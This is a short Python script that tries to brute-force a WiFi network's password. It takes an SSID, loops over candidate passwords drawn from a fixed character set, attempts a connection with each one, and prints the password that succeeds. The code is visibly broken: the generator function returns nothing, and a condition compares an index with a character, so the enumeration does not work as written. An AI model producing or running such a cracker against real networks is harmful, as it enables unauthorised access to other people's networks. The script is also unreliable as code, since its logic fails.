from wireless import Wireless

wire = Wireless()
ssid = input("enter ssid")
ps = ""
con = False
s = [""," ","a", "b","c","d","e","f", "g","h","i","j","k","l","m","n","o","p","q", "r", "s", "t","u","v", "w", "x", "y","z", "1","2","3","4","5", "6","7","8","9", "0", "@", "_"]
pss = ["","","","","","","","","","","",""]
ind = 0

def ls(a, b):
    for i in range(len(a)-1):
        if b == a[i]:
            return i

def nextpss():
    for i in range(len(pss)-1):
        if i == "_":
            pss[i] = " "

        else:
            ind = ls(s, pss[i])
            pss[i] = s[ind + 1]
            break

while con == False:
    for i in pss:
        ps += i
    try:
        wire.connect(ssid=ssid,password=ps)
    except Exception:
        pass
    else:
        con = True
        print("the password is " + ps)
    pss = nextpss()
    ps = ""
